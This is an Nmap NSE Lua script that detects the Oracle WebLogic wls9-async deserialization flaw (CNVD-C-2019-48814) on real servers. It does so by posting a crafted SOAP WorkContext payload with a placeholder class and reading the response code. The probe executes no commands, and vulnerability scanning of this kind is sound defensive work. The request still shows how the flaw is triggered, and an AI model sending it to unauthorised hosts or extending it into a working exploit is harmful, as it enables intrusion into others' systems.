local http = require "http"
local nmap = require "nmap"
local stdnse = require "stdnse"
local shortport = require "shortport"
local vulns = require "vulns"

description = [[
Weblogic CNVD-C-2019-48814
]]
---
-- @usage
-- nmap -sV -p 7001 <ip> --script weblogic-cnve-c-2019-48814
--
-- @output
-- PORT     STATE SERVICE
-- 7001/tcp open  afs3-callback
-- | weblogic-cnvd-d-2019-48814:
-- |   VULNERABLE:
-- |   Oracle WebLogic wls9-async Deserialization Remote Command Execution Vulnerability
-- |     State: VULNERABLE
-- |     IDs:  CNVD:CNVD-C-2019-48814
-- |
-- |     Disclosure date: 2019-04-17
-- |     References:
-- |       http://www.cnvd.org.cn/webinfo/show/4989
-- |_      http://xxlegend.com/2019/04/19/weblogic%20CVE-2019-2647%E7%AD%89%E7%9B%B8%E5%85%B3XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90

author = "Shad0wpf"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln","safe"}


portrule = function(host, port)
  if type(port.version) == "table" and port.version.name_confidence > 3 and port.version.product ~= nil then
    return string.find(port.version.product, "WebLogic", 1, true) and nmap.version_intensity() >= 7
  end
  return shortport.version_port_or_service({7001,7002,7003},"http")(host,port)
end


-- reference:Rvn0xsy's <rvn0xsy@gmail.com> "weblogic-CNVD-C-2019-48814.nse"
action = function(host,port)
  local vuln = {
    title ="Oracle WebLogic wls9-async Deserialization Remote Command Execution Vulnerability",
    IDS = {CNVD = 'CNVD-C-2019-48814'},
    risk_factor = "HIGH",
    description = [[]],
    references = {
        'http://xxlegend.com/2019/04/19/weblogic%20CVE-2019-2647%E7%AD%89%E7%9B%B8%E5%85%B3XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90',
        'http://www.cnvd.org.cn/webinfo/show/4989',
    },
    dates = {
      disclosure = {year = '2019', month = '04', day = '17'},
    },
    check_results = {},
    extra_info = {}
  }

    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
    vuln.state = vulns.STATE.NOT_VULN --default

    path = "/_async/AsyncResponseService"
    local result = http.get(host,port,path)
    local status = stdnse.output_table()
    if( result.status == 200)then
        if ( string.find(result.body,"async") == nil ) then
            local status = stdnse.output_table()
            status.Vuln = "False"
            return status
        end

        options = {}
        options['header'] = {}
        options['header']['Content-Type'] = 'text/xml'
        local payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n<soapenv:Header>\n<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n<void class=\"POC\">\n<array class=\"xx\" length=\"0\">\n</array>\n<void method=\"start\"/>\n</void>\n</work:WorkContext>\n</soapenv:Header>\n<soapenv:Body>\n<asy:onAsyncDelivery/>\n</soapenv:Body>\n</soapenv:Envelope>\n"
        local response = http.post(host,port,path,options,nil,payload)

        if ( response.status == 202 ) then
            vuln.state = vulns.STATE.VULN
            return vuln_report:make_output(vuln)
        end
    end
    return vuln_report:make_output(vuln)
end
